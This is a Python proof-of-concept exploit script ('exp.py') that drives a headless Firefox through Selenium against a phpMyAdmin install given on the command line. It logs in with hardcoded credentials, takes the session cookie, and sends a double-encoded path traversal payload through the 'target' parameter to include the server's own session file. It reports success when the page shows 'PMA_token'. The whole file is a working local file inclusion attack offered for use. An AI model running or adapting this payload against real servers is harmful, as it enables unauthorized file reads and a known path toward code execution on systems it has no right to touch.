import sys
from selenium import webdriver

def exp(host):
    firefox_opt = webdriver.FirefoxOptions()
    firefox_opt.add_argument("--headless")
    driver = webdriver.Firefox(firefox_options=firefox_opt)
    #driver = webdriver.Firefox()
    url = host + '/index.php'
    driver.get(url)
    #Select(driver.find_element_by_id("sel-lang ")).select_by_value("zh_cn")
     
    driver.find_element_by_id("input_username").clear()
    driver.find_element_by_id("input_username").send_keys("user")
    driver.find_element_by_id("input_password").clear()
    driver.find_element_by_id("input_password").send_keys("test")
    driver.find_element_by_id("input_go").click()
    cookie = driver.get_cookies()
    phpadmin_session=cookie[1]['value']
    url=host+'/index.php?target=db_sql.php%253f/../../../../../../../../sessions/sess_'+phpadmin_session
    driver.get(url)

    check =driver.find_element_by_id('page_content').text
    if "PMA_token" in check:
        print('Success Poc!')


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('Usage: exp.py host')
        exit(0)
    h = sys.argv[1]
    #h = 'http://192.168.56.107:8000'
    print("host is ",h)
    exp(h)